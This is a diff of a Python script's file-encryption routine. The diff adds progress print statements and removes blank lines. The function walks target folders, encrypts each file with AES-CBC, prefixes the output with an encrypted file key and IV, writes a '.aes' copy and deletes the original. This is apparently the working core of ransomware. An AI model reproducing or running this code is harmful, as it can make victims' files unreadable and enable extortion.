@@ -88,30 +88,25 @@ ENCRYPTED_KEY_SIZE = len(encrypted_file_key)
 
 def encrypt_file():
     for folder in folders_path:
-
+        print(f"[*] Scanning Folders: {folder}")
         for root, dirs, files in os.walk(folder):
-
-
             for file in files:
                 bufferSize = 128*1024
                 filePath = os.path.join(root, file)
                 if not os.path.isfile(filePath):
                     continue
 
-
                 if not file.endswith(".aes"):
+                    print(f"[+] Encrypted: {filePath}")
                     iv = os.urandom(16) # ıv yı kaydetmemeiz lazim
                     cipher = Cipher(algorithms.AES(file_key), modes.CBC(iv), backend=default_backend())
                     encryptor = cipher.encryptor()
-
                     padder = PKCS7(algorithms.AES.block_size).padder()
-
                     destination_path= os.path.join(root , file+".aes")
                     with open(filePath, "rb") as input_file:
                         with open(destination_path, "wb") as output_file:
                             output_file.write(encrypted_file_key)
                             output_file.write(iv)
-
                             while True:
                                 chunk = input_file.read(bufferSize)
                                 if not chunk:
@@ -126,8 +121,6 @@ def encrypt_file():
                             output_file.write(final_encrypted_chunk)
 
                     os.remove(filePath)
-
-
 
 if __name__ == "__main__":
     encrypt_file()
